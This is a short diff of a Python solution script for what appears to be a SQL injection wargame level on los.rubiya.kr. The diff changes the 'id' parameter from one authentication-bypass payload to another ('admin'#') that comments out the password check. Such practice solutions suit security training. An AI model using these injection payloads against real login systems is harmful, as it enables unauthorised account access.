@@ -23,7 +23,7 @@ import requests
 url = 'http://los.rubiya.kr/cobolt_b876ab5595253427d3bc34f1cd8f30db.php'
 cookies = {'PHPSESSID' : 'My PHPSESSID'}
 params = {}
-params['id'] = "'||id='admin'#"
+params['id'] = "admin'#"
 
 res = requests.get(url, cookies = cookies, params = params)
 
